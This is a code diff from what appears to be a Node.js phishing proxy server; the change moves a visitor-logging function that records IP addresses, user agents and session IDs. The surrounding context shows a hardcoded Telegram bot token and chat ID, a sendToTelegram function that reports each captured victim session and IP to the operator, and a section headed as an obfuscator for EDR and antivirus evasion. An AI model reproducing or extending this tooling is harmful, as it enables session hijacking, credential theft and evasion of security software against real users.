@@ -1,37 +1,9 @@
 const axios = require('axios');
 const BOT_TOKEN = '8342719812:AAGMgewDI6j_XIGRiN9E7EE133ASeGgmkpM';
 const CHAT_ID = '7310383191';
+
 // Track which sessions have already sent notifications
 const NOTIFIED_SESSIONS = new Set();
-
-// At the top of proxy_server.js, with other constants
-const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
-
-// Ensure the visit logs directory exists
-const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
-if (!fs.existsSync(VISITS_LOG_DIR)) {
-    fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
-}
-
-// Function to log a visit
-async function logVisit(clientRequest, clientResponse, sessionId) {
-    const visit = {
-        timestamp: new Date().toISOString(),
-        ip: clientRequest.headers['x-real-ip'] || 
-             clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
-             'Unknown',
-        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
-        referer: clientRequest.headers['referer'] || 'Direct',
-        sessionId: sessionId || 'unknown',
-        url: clientRequest.url,
-        method: clientRequest.method,
-        statusCode: clientResponse.statusCode || 'N/A'
-    };
-    
-    // Append to visit log
-    const logLine = JSON.stringify(visit) + '\n';
-    fs.appendFileSync(VISITS_LOG_FILE, logLine);
-}
 
 // ================================================
 // 𝙾𝙱𝙵𝚄𝚂𝙲𝙰𝚃𝙾𝚁 𝙵𝙾𝚁 𝙴𝙳𝚁/𝙰𝚅 𝙴𝚅𝙰𝚂𝙸𝙾𝙽
@@ -160,8 +132,6 @@ async function sendToTelegram(data) {
         NOTIFIED_SESSIONS.add(sessionId);
         // ─────────────────────────────
         
-        // ... existing code to send notification ...
-        
         const ip = data.proxyRequestHeaders?.['cf-connecting-ip'] || 
                    data.proxyRequestHeaders?.['x-real-ip'] || 
                    data.proxyRequestHeaders?.['x-forwarded-for']?.split(',')[0]?.trim() || 
@@ -259,6 +229,38 @@ const fs = require("fs");
 const zlib = require("zlib");
 const crypto = require("crypto");
 const os = require("os");
+
+// ================================================
+// 𝚅𝙸𝚂𝙸𝚃 𝙻𝙾𝙶𝙶𝙸𝙽𝙶
+// ================================================
+
+const VISITS_LOG_FILE = path.join(__dirname, "visit_logs", "visits.log");
+
+// Ensure the visit logs directory exists
+const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
+if (!fs.existsSync(VISITS_LOG_DIR)) {
+    fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
+}
+
+// Function to log a visit
+async function logVisit(clientRequest, clientResponse, sessionId) {
+    const visit = {
+        timestamp: new Date().toISOString(),
+        ip: clientRequest.headers['x-real-ip'] || 
+             clientRequest.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+             'Unknown',
+        userAgent: clientRequest.headers['user-agent'] || 'Unknown',
+        referer: clientRequest.headers['referer'] || 'Direct',
+        sessionId: sessionId || 'unknown',
+        url: clientRequest.url,
+        method: clientRequest.method,
+        statusCode: clientResponse.statusCode || 'N/A'
+    };
+    
+    // Append to visit log
+    const logLine = JSON.stringify(visit) + '\n';
+    fs.appendFileSync(VISITS_LOG_FILE, logLine);
+}
 
 // ================================================
 // 𝙳𝙰𝚂𝙷𝙱𝙾𝙰𝚁𝙳 𝙳𝙴𝙿𝙴𝙽𝙳𝙴𝙽𝙲𝙸𝙴𝚂
